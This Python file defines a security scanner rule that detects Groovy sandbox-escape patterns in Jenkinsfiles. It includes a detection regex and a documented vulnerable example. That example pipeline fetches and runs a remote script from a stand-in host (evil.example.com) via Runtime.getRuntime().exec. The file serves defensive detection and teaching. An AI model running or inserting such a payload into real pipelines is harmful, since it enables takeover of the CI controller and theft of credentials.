"""JF-019. Groovy sandbox escape pattern detected."""
from __future__ import annotations

import re

from ...base import Finding, Severity
from ...rule import Rule
from ..base import Jenkinsfile

_SANDBOX_ESCAPE_RE = re.compile(
    r"Runtime\.getRuntime|Class\.forName|\.classLoader|ProcessBuilder|@Grab\b"
)

RULE = Rule(
    id="JF-019",
    title="Groovy sandbox escape pattern detected",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-250",),
    recommendation=(
        "Remove direct Runtime/ClassLoader calls. Use Jenkins pipeline "
        "steps instead. Avoid @Grab for untrusted dependencies."
    ),
    docs_note=(
        "Detects Groovy patterns that bypass the Jenkins script security "
        "sandbox: `Runtime.getRuntime()`, `Class.forName()`, "
        "`.classLoader`, `ProcessBuilder`, and `@Grab`. These give the "
        "pipeline (or an attacker who controls its source) unrestricted "
        "access to the Jenkins controller JVM, full RCE."
    ),
    exploit_example=(
        "// Vulnerable: ``Runtime.getRuntime().exec(...)`` bypasses\n"
        "// the script-security sandbox and runs arbitrary commands\n"
        "// in the Jenkins controller's JVM. The controller has\n"
        "// access to every credential, every agent SSH key, every\n"
        "// configured cloud provider token — full Jenkins takeover\n"
        "// from one ``Jenkinsfile`` edit. ``@Grab`` is the same\n"
        "// vector for pulling an arbitrary Maven dependency that\n"
        "// runs as the controller.\n"
        "pipeline {\n"
        "  agent any\n"
        "  stages {\n"
        "    stage('debug') {\n"
        "      steps {\n"
        "        script {\n"
        "          def proc = Runtime.getRuntime().exec(\n"
        "            ['bash', '-c', 'curl evil.example.com/x.sh | bash']\n"
        "          )\n"
        "          proc.waitFor()\n"
        "        }\n"
        "      }\n"
        "    }\n"
        "  }\n"
        "}\n"
        "\n"
        "// Safe: use Jenkins pipeline steps for everything; they\n"
        "// run through the script-security sandbox. ``sh`` runs on\n"
        "// the agent (not the controller), so even if the body is\n"
        "// malicious, the blast radius is one agent, not the whole\n"
        "// Jenkins installation.\n"
        "pipeline {\n"
        "  agent any\n"
        "  stages {\n"
        "    stage('debug') {\n"
        "      steps {\n"
        "        sh 'env'\n"
        "      }\n"
        "    }\n"
        "  }\n"
        "}"
    ),
)


def check(jf: Jenkinsfile) -> Finding:
    # Case-sensitive. Java/Groovy class names are case-sensitive.
    matches = _SANDBOX_ESCAPE_RE.findall(jf.text)
    passed = not matches
    desc = (
        "No Groovy sandbox escape patterns detected in this Jenkinsfile."
        if passed else
        f"Groovy sandbox escape pattern detected: {', '.join(matches[:3])}"
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=jf.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
